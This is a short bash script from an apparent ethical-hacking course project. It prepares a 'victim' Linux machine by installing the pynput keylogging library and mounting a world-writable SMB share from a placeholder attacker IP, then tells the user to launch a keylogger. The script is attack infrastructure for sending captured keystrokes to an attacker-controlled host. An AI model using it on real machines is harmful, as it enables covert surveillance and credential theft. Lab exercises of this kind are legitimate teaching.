#!/bin/bash
# setup_victim.sh — CSCI369 Ethical Hacking Project
# Run this on the VICTIM machine to install dependencies and mount the share.
# Educational use only. Run only in authorized lab environments.

set -e

ATTACKER_IP="<ATTACKER_IP>"     # ← Replace with actual attacker IP before use
SHARE_NAME="logs"
MOUNT_POINT="/mnt/attacker_logs"

echo "[*] Updating package list..."
sudo apt update -q

echo "[*] Installing cifs-utils and pip..."
sudo apt install -y cifs-utils python3-pip

echo "[*] Installing pynput..."
pip install pynput --break-system-packages -q

echo "[*] Creating mount point: $MOUNT_POINT"
sudo mkdir -p "$MOUNT_POINT"

echo "[*] Mounting attacker share from $ATTACKER_IP..."
sudo mount -t cifs "//$ATTACKER_IP/$SHARE_NAME" "$MOUNT_POINT" \
    -o guest,uid="$(id -u)",gid="$(id -g)",file_mode=0777,dir_mode=0777

echo "[*] Testing write access..."
if echo "setup_test" > "$MOUNT_POINT/test.txt" 2>/dev/null; then
    rm "$MOUNT_POINT/test.txt"
    echo "[+] Write access confirmed."
else
    echo "[-] Write test failed. Check attacker share permissions."
    exit 1
fi

echo ""
echo "[+] Victim setup complete."
echo "    Mounted : //$ATTACKER_IP/$SHARE_NAME → $MOUNT_POINT"
echo ""
echo "[*] To start the keylogger, run:"
echo "    python3 keylogger.py"
